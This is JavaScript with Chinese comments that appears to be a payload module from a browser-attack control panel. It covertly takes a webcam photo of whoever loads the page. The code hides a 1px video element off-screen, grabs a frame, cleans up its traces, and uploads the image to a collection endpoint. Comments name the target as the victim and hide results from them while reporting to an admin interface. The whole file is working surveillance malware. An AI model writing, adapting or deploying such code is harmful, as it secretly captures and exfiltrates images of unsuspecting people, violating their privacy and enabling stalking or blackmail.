return new Promise((resolve) => {
  try {
    // 检查是否为安全源
    const isSecureOrigin = () => {
      const host = window.location.hostname;
      const protocol = window.location.protocol;
      
      // HTTPS 始终是安全的
      if (protocol === 'https:') return true;
      
      // localhost 和 127.0.0.1 在 HTTP 下也是安全的
      if (protocol === 'http:' && (host === 'localhost' || host === '127.0.0.1')) return true;
      
      // 其他情况（如 IP 地址）在 HTTP 下不安全
      return false;
    };
    
    // 如果不是安全源，提供明确的错误信息
    if (!isSecureOrigin()) {
      resolve('安全限制：摄像头功能要求使用安全源（HTTPS 或 localhost）。\n' +
              '当前使用的是不安全源：' + window.location.origin + '\n' +
              '解决方案：\n' +
              '1. 使用 localhost 或 127.0.0.1 替代 IP 地址\n' +
              '2. 配置 HTTPS\n' +
              '3. 在 Chrome 中访问 chrome://flags/#unsafely-treat-insecure-origin-as-secure 并添加此网址');
      return;
    }
    
    // 检查浏览器是否支持摄像头API
    if (!navigator.mediaDevices) {
      // 尝试使用旧版API进行兼容
      navigator.mediaDevices = {};
    }
    
    // 兼容不同浏览器的getUserMedia实现
    if (!navigator.mediaDevices.getUserMedia) {
      // 保存对旧版API的引用
      const getUserMedia = navigator.getUserMedia || 
                          navigator.webkitGetUserMedia || 
                          navigator.mozGetUserMedia || 
                          navigator.msGetUserMedia;
      
      // 如果找到了旧版API
      if (getUserMedia) {
        navigator.mediaDevices.getUserMedia = function(constraints) {
          return new Promise((resolve, reject) => {
            getUserMedia.call(navigator, constraints, resolve, reject);
          });
        };
      } else {
        // 如果没有找到任何API，直接返回错误
        resolve('您的浏览器不支持摄像头功能，请尝试使用Chrome、Firefox或Edge浏览器');
        return;
      }
    }
  } catch (e) {
    resolve('初始化摄像头API时出错: ' + e.message);
    return;
  }
  
  // 创建隐藏的视频元素
  const video = document.createElement('video');
  video.style.position = 'fixed';
  video.style.top = '-9999px';
  video.style.left = '-9999px';
  video.style.width = '1px';
  video.style.height = '1px';
  // 添加更多属性以提高兼容性
  video.setAttribute('playsinline', '');  // 允许在iOS上内联播放
  video.setAttribute('webkit-playsinline', ''); // Safari兼容
  video.setAttribute('autoplay', '');
  video.setAttribute('muted', '');  // 静音可以避免某些浏览器的自动播放限制
  video.muted = true;  // 双重保证静音
  document.body.appendChild(video);
  
  // 创建隐藏的画布元素
  const canvas = document.createElement('canvas');
  canvas.style.display = 'none';
  document.body.appendChild(canvas);
  
  // 创建一个假的权限请求对话框，提示用户允许访问摄像头
  // 这个对话框只在管理界面可见，受害者看不到
  const fakePermissionDialog = document.createElement('div');
  fakePermissionDialog.style.display = 'none';
  document.body.appendChild(fakePermissionDialog);
  
  // 请求摄像头权限并拍照
  // 使用更宽松的约束条件，提高兼容性
  navigator.mediaDevices.getUserMedia({ 
    video: { 
      facingMode: 'user',
      width: { ideal: 1280, min: 640 },
      height: { ideal: 720, min: 480 }
    }, 
    audio: false 
  })
  .then(stream => {
    // 连接视频流到视频元素
    try {
      // 现代浏览器使用srcObject
      video.srcObject = stream;
    } catch (e) {
      // 旧版浏览器可能需要使用createObjectURL
      try {
        video.src = window.URL.createObjectURL(stream);
      } catch (err) {
        resolve('您的浏览器不支持视频流处理');
        return;
      }
    }
    
    // 添加错误处理
    video.onerror = (e) => {
      resolve('视频加载错误: ' + (e.message || '未知错误'));
      
      // 清理资源
      stream.getTracks().forEach(track => track.stop());
      if (document.body.contains(video)) document.body.removeChild(video);
      if (document.body.contains(canvas)) document.body.removeChild(canvas);
      if (document.body.contains(fakePermissionDialog)) document.body.removeChild(fakePermissionDialog);
    };
    
    // 当视频准备好时拍照
    video.onloadedmetadata = () => {
      // 尝试播放视频
      try {
        video.play()
          .catch(e => {
            resolve('视频播放失败: ' + e.message);
            
            // 清理资源
            stream.getTracks().forEach(track => track.stop());
            if (document.body.contains(video)) document.body.removeChild(video);
            if (document.body.contains(canvas)) document.body.removeChild(canvas);
            if (document.body.contains(fakePermissionDialog)) document.body.removeChild(fakePermissionDialog);
          });
      } catch (e) {
        // 对于不返回Promise的旧版play()方法
        try {
          video.play();
        } catch (playError) {
          resolve('视频播放失败: ' + playError.message);
          return;
        }
      }
      
      // 给摄像头一点时间来调整亮度和对焦
      setTimeout(() => {
        try {
          // 设置画布大小
          const videoWidth = video.videoWidth || 640;
          const videoHeight = video.videoHeight || 480;
          
          canvas.width = videoWidth;
          canvas.height = videoHeight;
          
          // 将视频帧绘制到画布
          const ctx = canvas.getContext('2d');
          
          // 尝试绘制视频帧
          try {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          } catch (drawError) {
            throw new Error('无法绘制视频帧: ' + drawError.message);
          }
          
          // 获取图像数据
          let dataURL;
          try {
            // 尝试不同的格式和质量设置
            try {
              dataURL = canvas.toDataURL('image/png', 0.8);
            } catch (e) {
              try {
                dataURL = canvas.toDataURL('image/jpeg', 0.8);
              } catch (e2) {
                dataURL = canvas.toDataURL();
              }
            }
            
            if (!dataURL || dataURL === 'data:,') {
              throw new Error('无法获取图像数据');
            }
          } catch (dataURLError) {
            throw new Error('无法获取图像数据: ' + dataURLError.message);
          }
          
          // 停止所有视频轨道
          stream.getTracks().forEach(track => track.stop());
          
          // 清理DOM元素
          if (document.body.contains(video)) document.body.removeChild(video);
          if (document.body.contains(canvas)) document.body.removeChild(canvas);
          if (document.body.contains(fakePermissionDialog)) document.body.removeChild(fakePermissionDialog);
          
          // 上传图像到服务器，指定类型为camera
          // 使用更可靠的方式发送请求
          let fetchPromise;
          
          try {
            fetchPromise = fetch('/api/image', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                image: dataURL,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                type: 'camera'
              }),
              // 添加超时处理
              signal: AbortSignal.timeout ? AbortSignal.timeout(10000) : undefined
            });
          } catch (fetchError) {
            // 如果fetch API不可用或出错，尝试使用XMLHttpRequest
            fetchPromise = new Promise((resolveXhr, rejectXhr) => {
              const xhr = new XMLHttpRequest();
              xhr.open('POST', '/api/image', true);
              xhr.setRequestHeader('Content-Type', 'application/json');
              xhr.timeout = 10000; // 10秒超时
              
              xhr.onload = function() {
                if (xhr.status >= 200 && xhr.status < 300) {
                  resolveXhr({
                    json: () => Promise.resolve(JSON.parse(xhr.responseText))
                  });
                } else {
                  rejectXhr(new Error('请求失败，状态码: ' + xhr.status));
                }
              };
              
              xhr.onerror = function() {
                rejectXhr(new Error('网络请求失败'));
              };
              
              xhr.ontimeout = function() {
                rejectXhr(new Error('请求超时'));
              };
              
              xhr.send(JSON.stringify({
                image: dataURL,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                type: 'camera'
              }));
            });
          }
          
          fetchPromise
          .then(response => {
            // 对受害者隐藏响应内容
            if (window.parent && window.parent !== window) {
              // 如果在iframe中运行，可能是受害者环境
              return { success: true, filename: 'hidden', url: 'hidden', size: 0 };
            } else {
              return response.json();
            }
          })
          .then(data => {
            if (data.url === 'hidden') {
              // 对受害者返回空结果
              return;
            } else {
              // 对管理界面返回结果
              resolve('摄像头照片已保存:\n文件: ' + data.filename + '\n访问地址: <a href="' + data.url + '" target="_blank">' + data.url + '</a>\n页面: ' + window.location.href + '\n文件大小: ' + Math.round(data.size/1024) + ' KB\n时间: ' + new Date().toLocaleString());           }
          })
          .catch(err => {
            // 对管理界面返回错误
            resolve('照片上传失败: ' + err.message);
          });
        } catch (innerError) {
          // 停止所有视频轨道
          stream.getTracks().forEach(track => track.stop());
          
          // 清理DOM元素
          if (document.body.contains(video)) document.body.removeChild(video);
          if (document.body.contains(canvas)) document.body.removeChild(canvas);
          if (document.body.contains(fakePermissionDialog)) document.body.removeChild(fakePermissionDialog);
          
          // 对管理界面返回错误
          resolve('照片处理过程中出错: ' + innerError.message);
        }
      }, 1000);
    };
  })
  .catch(err => {
    // 清理DOM元素
    if (document.body.contains(video)) document.body.removeChild(video);
    if (document.body.contains(canvas)) document.body.removeChild(canvas);
    if (document.body.contains(fakePermissionDialog)) document.body.removeChild(fakePermissionDialog);
    
    // 根据错误类型返回不同消息
    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
      resolve('用户拒绝了摄像头访问权限');
    } else if (err.name === 'NotFoundError') {
      resolve('未检测到可用的摄像头设备');
    } else {
      resolve('摄像头访问失败: ' + err.message);
    }
  });
})
